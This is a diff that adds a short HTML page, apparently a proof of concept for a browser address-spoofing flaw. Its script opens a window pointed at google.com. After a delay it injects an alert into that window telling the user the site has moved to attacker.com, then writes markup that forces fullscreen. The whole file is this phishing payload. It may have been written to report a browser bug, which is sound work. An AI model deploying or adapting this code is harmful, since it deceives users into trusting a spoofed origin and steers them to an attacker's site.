@@ -1,0 +1,24 @@
+
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<a href="#" onclick="myFunction()">Try it</button>
+
+<script>
+function myFunction() {
+ var x = window.open("https://www.google.com:8888");
+
+   setTimeout(function(){x.alert('www.google.com was move+ please visit https://attacker.com')}, 1850)
+
+
+   setTimeout(function(){x.document.write(`
+        <input onclick="document.documentElement.requestFullscreen();"/>
+    `);}, 2400)
+}
+</script>
+
+</body>
+</html>
+
